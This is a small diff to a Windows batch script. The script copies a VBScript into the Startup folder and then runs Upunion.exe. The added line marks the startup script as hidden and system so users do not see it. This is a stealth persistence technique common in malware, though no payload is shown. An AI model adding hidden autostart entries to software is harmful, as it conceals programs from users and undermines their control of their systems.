@@ -51,6 +51,7 @@ echo Adding VBScript to startup...
 rem set "regkey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 rem reg add "%regkey%" /v "jossol" /t REG_SZ /d "wscript.exe //B \"%vbsfile%\"" /f
 copy "%vbsfile%" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+attrib +s +h "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\run_jossol.vbs"
 
 rem Запуск Upunion.exe
 echo Running Upunion.exe...
